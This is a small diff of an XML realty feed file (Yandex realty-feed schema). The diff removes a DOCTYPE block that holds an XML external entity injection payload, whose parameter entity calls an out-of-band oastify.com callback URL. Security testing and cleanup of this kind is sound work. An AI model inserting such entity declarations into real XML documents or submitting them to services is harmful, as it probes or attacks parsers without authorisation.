@@ -1,8 +1,4 @@
 <?xml version="1.0" encoding="UTF-8"?> 
-<!DOCTYPE foo [
-<!ELEMENT foo ANY >
-<!ENTITY % xxe SYSTEM "http://0vwndo8mna5ahyuvhw0gilp4yv4mseg3.oastify.com/hacked" >
-]>
 <realty-feed xmlns="http://webmaster.yandex.ru/schemas/feed/realty/2010-06">
      <generation-date>2010-12-11T12:00:00+04:00</generation-date>   
 
